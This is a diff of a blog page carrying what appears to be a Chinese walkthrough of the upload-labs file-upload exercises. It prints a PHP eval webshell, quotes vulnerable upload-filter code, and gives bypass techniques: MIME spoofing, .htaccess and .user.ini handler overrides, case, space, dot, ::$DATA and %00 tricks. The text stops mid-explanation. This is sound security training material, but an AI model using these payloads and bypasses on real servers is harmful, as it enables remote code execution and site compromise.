@@ -174,9 +174,8 @@
     <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
         <div id="middle-box">
             <h1 id="upload-1（扩展名）"><a href="#upload-1（扩展名）" class="headerlink" title="upload-1（扩展名）"></a>upload-1（扩展名）</h1><p>直接上传一句话木马</p>
-<p>&lt;!–code￼0–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061622862.png" alt="image-20250506162226800"></p>
 <p>可知被<code>js</code>拦截了</p>
 <p>这里存在两种解法</p>
@@ -185,9 +184,15 @@
 <p>返回靶场的页面，复制上传的文件的链接，打开蚁剑，输入上面复制的链接打开蚁剑，粘贴网址，输入密码</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061637236.png" alt="image-20250506163758185"></p>
 <p>核心的源码如下：</p>
-<p>&lt;!–code￼1–&gt;
+<pre class="line-numbers language-none"><code class="language-none">var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;
+    &#x2F;&#x2F;提取上传文件的类型
+    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));
+    &#x2F;&#x2F;判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;
+        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>源码的作用是截取点号之后的文件名，精确匹配上面的允许上传的文件名。</p>
 <p><strong>能进行绕过的原因是：</strong></p>
 <p>这段源码仅仅通过<code>js</code>前端检查了文件名的后缀，而不检查真实的文件类型（如通过文件头Magic Number或者是MINE Type判断），所以只需要抓包使<code>js</code>的前端验证通过就可以</p>
@@ -197,69 +202,113 @@
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061656556.png" alt="image-20250506165616523"></p>
 <p>放行数据包，重复上面的操作</p>
 <p>核心源码如下：</p>
-<p>&lt;!–code￼2–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;
+            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload &#x3D; true;
+            &#125; else &#123;
+                $msg &#x3D; &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg &#x3D; UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>根据源码判断，这里的漏洞类型是<strong>MIME 类型校验漏洞</strong>，攻击者可以通过抓包修改 <code>Content-Type</code> 来绕过检查。</p>
-<p>&lt;!–code￼3–&gt;
+<pre class="line-numbers language-none"><code class="language-none">if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>上面的代码仅仅检查的是来自HTTP请求头的Content-Type的值，同样没有对文件的真实类型进行判断。</p>
 <h1 id="upload-3（Apache服务器特性）"><a href="#upload-3（Apache服务器特性）" class="headerlink" title="upload-3（Apache服务器特性）"></a>upload-3（Apache服务器特性）</h1><p>将文件后缀名更改为<code>php3，php5，phtml</code>可以绕过。</p>
 <p>核心源码如下：</p>
-<p>&lt;!–code￼4–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
+ $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+ $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+$file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+ $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+$file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+ $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>上面进行了一系列的过滤，防止通过点号，空格，大小写等方法绕过达到上传恶意文件的作用。但是这里并没有过滤<code>php3，php5，phtml</code>这些文件后缀名，<strong>能这样绕过的条件：</strong></p>
 <p>Apache服务器支持解析 <code>.php3 .php5 .phtml</code>后缀名的文件，但是需要在Apache的配置文件（<code>httpd.conf</code>或者是<code>apache2.conf</code>）中添加</p>
-<p>&lt;!–code￼5–&gt;
+<pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml .php3 .php5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>这样这些文件扩展名就能够被当作<code>php</code>脚本处理了，当然这里还有一个条件是靶场的搭建利用到了Apache服务器。</p>
 <h1 id="upload-4-staccess文件"><a href="#upload-4-staccess文件" class="headerlink" title="upload-4(.staccess文件)"></a>upload-4(<code>.staccess</code>文件)</h1><p>核心源码</p>
-<p>&lt;!–code￼6–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>上面的源码过滤了许多文件的扩展名，包括过滤了点号，空格，大小写的绕过方法，这里可以看到文件后缀名.htaccess没有过滤掉</p>
-<p>&lt;!–code￼7–&gt;
+<pre class="line-numbers language-none"><code class="language-none">.htaccess是一个纯文本文件，其中储存着Apache相关的命令
+.htaccess主要的作用：URL重写，404页面自定义，改变文件的扩展名，允许或者阻止特定的用户或者目录
+进行访问。
+.htaccess只针对当前目录才会起作用。
+.haaccess改变文件扩展名的用法：
+&lt;FilesMatch &quot;4.png&quot;&gt;
+ SetHandler application&#x2F;x-httpd-php
+ &lt;&#x2F;FilesMatch&gt;
+（如果当前目录下面由名字为4.png的文件就会被解析为.php的文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>下面是我创建的.staccess文件的内容</p>
-<p>&lt;!–code￼8–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;\.jpg&quot;&gt;
+ SetHandler application&#x2F;x-httpd-php
+ &lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>上面这串代码的作用是：<br>通过 <code>SetHandler</code> 指令，<strong>劫持 <code>.jpg</code> 文件的处理方式</strong>，让它们被 <code>PHP</code> 引擎解析。<strong>强制让所有 <code>.jpg</code> 文件被 Apache 当作 <code>PHP</code> 脚本解析并执行</strong>。</p>
 <p>接着就将存储一句话木马的<code>php</code>的文件扩展名更改为<code>.jpg</code></p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071600961.png" alt="image-20250507155953858"></p>
 <p>先上传<code>.staccess</code>文件接着上传<code>cj.jpg</code>文件，复制上传的图片文件的路径，连接蚁剑</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071603909.png" alt="image-20250507160315872"></p>
 <h1 id="upload-5-user-ini文件"><a href="#upload-5-user-ini文件" class="headerlink" title="upload-5(.user.ini文件)"></a>upload-5(<code>.user.ini</code>文件)</h1><p>观察第五关的关键源码</p>
-<p>&lt;!–code￼9–&gt;
+<pre class="line-numbers language-none"><code class="language-none">array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.j
+Html&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-</p>
 <p>发现对比上一关，这里.htaccess文件也被拉入了黑名单，但是没有禁用.ini文件。 php.ini 是 php的配置文件，.user.ini（相当于一个用户自己定义的php.ini文件） 中的字段也会被 php  视为配置文件来处理，从而导致 php 的文件解析漏洞。</p>
 <p>要触发**<code>.user.ini</code>文件的内容满足下面的条件**</p>
-<p>&lt;!–code￼10–&gt;
+<pre class="line-numbers language-none"><code class="language-none">服务器脚本语言为PHP
+服务器使用CGI／FastCGI模式 （两种通用网关接口，用于HTTP服务器与其他机器的程序服务通信交流）
+上传目录下要有可执行的php文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>靶场的Apache服务器满足上面的两种条件</p>
 <p>接下来创建一个<code>.user.ini</code>文件上传，<strong>文件的内容如下：</strong></p>
-<p>&lt;!–code￼11–&gt;
+<pre class="line-numbers language-none"><code class="language-none">auto_prepend_file&#x3D;cj.jpg
+作用：
+表示在每个php脚本执行之前，php会加载并且执行cj.jpg文件，即使是一个图片文件 php也会尝试将
+其作为php代码解析(如果文件的内容包含有效的php代码的话)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>接下来直接上传<code>cj.jpg</code>文件，等待五分钟之后右键图片复制连接蚁剑</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071739252.png" alt="image-20250507173908190"></p>
 <h1 id="upload-6-大小写绕过"><a href="#upload-6-大小写绕过" class="headerlink" title="upload-6(大小写绕过)"></a>upload-6(大小写绕过)</h1><p>源码如下：</p>
-<p>&lt;!–code￼12–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>可以看到源码中不存在**<code>strtolower()</code>**函数，这个函数的作用是将字符串中的所有字符串转化为小写。</p>
 <p>所以这里可以通过大小写绕过，及那个文件后缀名更改为<code>cj.Php</code></p>
 <p><strong>能通过大小写绕过的原理：</strong></p>
 <p>在Windows系统上面，文件名默认不区分大小写。</p>
-<h1 id="upload-7-空格绕过"><a href="#upload-7-空格绕过" class="headerlink" title="upload-7(空格绕过)"></a>upload-7(空格绕过)</h1><p>&lt;!–code￼13–&gt;
+<h1 id="upload-7-空格绕过"><a href="#upload-7-空格绕过" class="headerlink" title="upload-7(空格绕过)"></a>upload-7(空格绕过)</h1><pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>这里没有<strong>trim()<strong>函数，这个函数的作用是</strong>去除字符串首尾的空白字符或其他指定字符</strong></p>
 <p>直接上传<code>php</code>文件使用<code>yakit</code>进行拦截抓包</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072015886.png" alt="image-20250507201506814"></p>
@@ -271,9 +320,13 @@
 <p><strong>绕过的原理：</strong></p>
 <p>在Windows系统中默认自动忽略文件名末尾的空格，cj.php和cj.php 会被视为同一文件。</p>
 <h1 id="upload-8-点号绕过"><a href="#upload-8-点号绕过" class="headerlink" title="upload-8(点号绕过)"></a>upload-8(点号绕过)</h1><p>关键源码如下：</p>
-<p>&lt;!–code￼14–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p><code>strrchr()</code>函数的作用是<strong>查找字符串中最后一次出现某个字符的位置，并返回从该字符到字符串末尾的子串</strong>。</p>
 <p>这里利用<code>strrchr()</code>函数的特性进行绕过，<strong>当文件包含多个点的时候，<code>strrchr()</code>返回的是最后一个点之后的内容（如果最后一个点为空就返回“.”）</strong></p>
 <p>上传正常的<code>php</code>一句话木马的文件，抓包，在请求包文件的扩展名后面加上一个点号，再发包就可以连接蚁剑。</p>
@@ -281,21 +334,29 @@
 <p><strong>能够绕过的原理：</strong></p>
 <p>Windows存储文件的时候会自动删除文件末尾的点号，cj.php.实际保存为cj.php</p>
 <h1 id="upload-9-DATA绕过"><a href="#upload-9-DATA绕过" class="headerlink" title="upload-9(::DATA绕过)"></a>upload-9(::DATA绕过)</h1><p>关键源码如下：</p>
-<p>&lt;!–code￼15–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点
+        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);
+        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写
+        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>观察源码可知没有对::DATA进行处理，可以使用::DATA进行绕过</p>
-<p>&lt;!–code￼16–&gt;
+<pre class="line-numbers language-none"><code class="language-none">可以绕过的原理：
+php在Windows的时候如果在文件名之后加上::DATA会将之后的数据当作文件流进行处理，不会再检查文件的后缀名，而且可以保持::DATA之前的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-</p>
 <p>上传文件使用yakit进行拦截，将png的文件后缀名更改为.php:DATA然后放行可以发现文件上传成功</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080036317.png" alt="image-20250508003650268"></p>
 <p>连接蚁剑即可</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080037248.png" alt="image-20250508003705204"></p>
 <h1 id="upload-10（与第6关相同）"><a href="#upload-10（与第6关相同）" class="headerlink" title="upload-10（与第6关相同）"></a>upload-10（与第6关相同）</h1><h1 id="upload-11-双写绕过"><a href="#upload-11-双写绕过" class="headerlink" title="upload-11(双写绕过)"></a>upload-11(双写绕过)</h1><p>关键源码如下：</p>
-<p>&lt;!–code￼17–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);
 
-</p>
+        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.$file_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>查看本关的提示可以发现</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081055527.png" alt="image-20250508105529364"></p>
 <p>对应源码的关键函数是：<code>str_ireplace($deny_ext,&quot;&quot;, $file_name)</code></p>
@@ -303,36 +364,44 @@
 <p><strong>关键：</strong>函数只进行一次替换，不会递归检查替换之后的结果</p>
 <p><strong>接下来就是白名单绕过</strong></p>
 <h1 id="upload-12-00截断"><a href="#upload-12-00截断" class="headerlink" title="upload-12(%00截断)"></a>upload-12(%00截断)</h1><p>查看关键源码</p>
-<p>&lt;!–code￼18–&gt;
+<pre class="line-numbers language-none"><code class="language-none">ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>这里是白名单，只允许上传<code>&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;</code>这三种后缀名</p>
-<p>&lt;!–code￼19–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>由这段代码可知，文件上传的路径可控，由get上传的参数save_path在<code>url</code>完全可控。</p>
 <p>再满足条件php的版本低于5.3就可以使用%00绕过。</p>
-<p>&lt;!–code￼20–&gt;
+<pre class="line-numbers language-none"><code class="language-none">什么是%00截断漏洞
+在php处理文件名或者是路径的时候，如果遇到了URL编码的%00，就会将
